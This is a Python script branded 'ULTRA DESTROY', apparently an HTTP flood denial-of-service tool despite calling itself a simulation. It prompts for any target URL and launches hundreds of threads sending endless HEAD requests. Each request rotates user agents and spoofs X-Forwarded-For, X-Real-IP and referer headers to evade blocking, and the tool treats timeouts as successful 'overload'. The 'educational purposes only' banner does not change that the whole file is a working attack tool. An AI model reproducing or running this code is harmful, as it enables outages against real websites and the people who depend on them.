import os
import threading
import time
import requests
import pyfiglet
from termcolor import colored
import socket
import random
import sys

class FastAttackSimulator:
    def __init__(self):
        self.running = False
        self.requests_sent = 0
        self.start_time = time.time()
        # Extended list of user agents for better simulation
        self.user_agents = [
            # Chrome
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            
            # Firefox
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux i686; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0 Mobile/15E148 Safari/605.1.15",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/89.0",
            
            # Safari
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            
            # Edge
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
            
            # Opera
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203",
            "Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36 OPR/63.3.3216.58675",
            
            # Samsung Browser
            "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36",
            
            # UC Browser
            "Mozilla/5.0 (Linux; U; Android 10; en-US; SM-G981B Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.1.0.1300 Mobile Safari/537.36",
            
            # Facebook App
            "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/315.0.0.47.113;]",
            
            # Instagram App
            "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 Instagram 185.0.0.31.112 Android (29/10; 480dpi; 1080x2034; samsung; SM-G981B; y2s; exynos990; en_GB; 253164539)",
            
            # Twitter App
            "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 Twitter for Android",
            
            # LinkedIn App
            "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 LinkedIn/5.0.510 (Linux; U; Android 10; en-us; SM-G981B Build/QP1A.190711.020; Cronet/58.0.2991.0)",
            
            # Pinterest App
            "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 Pinterest/9.30.0",
            
            # Snapchat App
            "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 Snapchat/10.78.5.0 (SM-G981B; Android 10; gzip)",
            
            # WhatsApp App
            "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 WhatsApp/2.21.15.20",
            
            # Discord App
            "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 Discord/69.9",
            
            # Googlebot
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            
            # Bingbot
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            
            # DuckDuckBot
            "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)",
            
            # Slackbot
            "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
            
            # Python Requests
            "python-requests/2.25.1",
            
            # Curl
            "curl/7.68.0",
            
            # Wget
            "Wget/1.20.3 (linux-gnu)",
            
            # Go HTTP Client
            "Go-http-client/1.1",
            
            # Java HTTP Client
            "Java/1.8.0_291",
            
            # .NET Framework
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59 .NET CLR 3.5.30729",
            
            # PlayStation
            "Mozilla/5.0 (PlayStation 4 8.52) AppleWebKit/605.1.15 (KHTML, like Gecko)",
            "Mozilla/5.0 (PlayStation 5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15",
            
            # Nintendo Switch
            "Mozilla/5.0 (Nintendo Switch; WebApplet) AppleWebKit/609.4 (KHTML, like Gecko) NF/6.0.2.21.2 NintendoBrowser/5.1.0.22474",
            
            # Smart TVs
            "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 DMOST/2.0.0 (; LGE; webOSTV; WEBOS6.3.2 03.34.70; W6_lm21a; )",
            "Mozilla/5.0 (Linux; Android 9; SmartTV Build/MTK6681P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Safari/537.36",
            
            # IoT Devices
            "Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
            
            # Legacy Browsers
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
            
            # Specialized Browsers
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10"
        ]

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def display_banner(self):
        self.clear_screen()
        ascii_banner = pyfiglet.figlet_format("ULTRA DESTROY")
        print(colored(ascii_banner, 'red'))
        print(colored("TikTok: zted_or_npc", 'red'))
        print(colored("WARNING: For educational purposes only!", 'yellow'))
        print(colored("ULTRA HIGH-SPEED simulation starting...\n", 'cyan'))

    def generate_random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def generate_random_referer(self, domain):
        subdomains = ['', 'www.', 'api.', 'shop.', 'blog.', 'cdn.', 'static.', 'img.', 'video.']
        paths = ['', '/', '/home', '/index.php', '/main.html', '/wp-admin', '/login', '/api/v1/users']
        return f"http://{random.choice(subdomains)}{domain}{random.choice(paths)}"

    def ultra_fast_attack(self, target_url, attack_id):
        session = requests.Session()
        session.trust_env = False  # Disable proxy usage for speed
        
        while self.running:
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'X-Forwarded-For': self.generate_random_ip(),
                    'X-Real-IP': self.generate_random_ip(),
                    'X-Client-IP': self.generate_random_ip(),
                    'Referer': self.generate_random_referer(target_url.split('/')[2]),
                    'Accept-Language': random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.8', 'de-DE,de;q=0.7', 'es-ES,es;q=0.6']),
                    'Cache-Control': 'no-cache',
                    'Accept': random.choice(['text/html', 'application/json', '*/*']),
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive'
                }
                
                # Use HEAD requests for maximum speed (no body download)
                response = session.head(target_url, headers=headers, timeout=2, allow_redirects=True)
                self.requests_sent += 1
                if response.status_code == 200:
                    print(colored(f"[{attack_id}] HIT! → {response.status_code}", 'green'))
                else:
                    print(colored(f"[{attack_id}] BLOCKED → {response.status_code}", 'yellow'))
            except:
                # Even errors mean we're overwhelming the target
                self.requests_sent += 1
                print(colored(f"[{attack_id}] OVERLOAD → Timeout/Error", 'red'))
                
    def stats_monitor(self):
        """Show real-time attack statistics"""
        last_count = 0
        while self.running:
            time.sleep(2)
            current_count = self.requests_sent
            requests_per_sec = (current_count - last_count) / 2
            last_count = current_count
            elapsed = time.time() - self.start_time
            print(colored(f"\n⚡ REQUESTS: {self.requests_sent} | ⚡ RATE: {requests_per_sec:.1f}/sec | ⚡ TIME: {elapsed:.1f}s", 'cyan'))
            print(colored("Press CTRL+C to stop the attack", 'yellow'))

    def run(self):
        self.display_banner()
        
        # Get target URL
        target_url = input("Enter target URL (with http:// or https://): ").strip()
        if not target_url.startswith(('http://', 'https://')):
            print(colored("Invalid URL! Please include http:// or https://", 'red'))
            return
            
        # Get number of threads
        try:
            num_threads = int(input("Enter number of attack threads (default 200): ") or 200)
            if num_threads <= 0:
                num_threads = 200
        except ValueError:
            num_threads = 200
            
        print(colored(f"\n🔥 Starting ULTRA attack with {num_threads} threads...", 'green'))
        print(colored("🔥 Press CTRL+C to stop the attack\n", 'yellow'))
        time.sleep(2)
        
        # Start attack
        self.running = True
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.stats_monitor)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start attack threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.ultra_fast_attack, args=(target_url, i+1))
            t.daemon = True
            t.start()
            threads.append(t)
            
        # Wait for Ctrl+C
        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print(colored("\n🛑 Stopping attack...", 'red'))
            
            # Final stats
            elapsed = time.time() - self.start_time
            requests_per_sec = self.requests_sent / elapsed if elapsed > 0 else 0
            print(colored(f"\n🔥 FINAL STATS:", 'green'))
            print(colored(f"🔥 Total Requests: {self.requests_sent}", 'green'))
            print(colored(f"🔥 Attack Duration: {elapsed:.2f} seconds", 'green'))
            print(colored(f"🔥 Average Rate: {requests_per_sec:.2f} requests/second", 'green'))
            print(colored("\nSimulation complete.", 'green'))

if __name__ == "__main__":
    simulator = FastAttackSimulator()
    simulator.run()
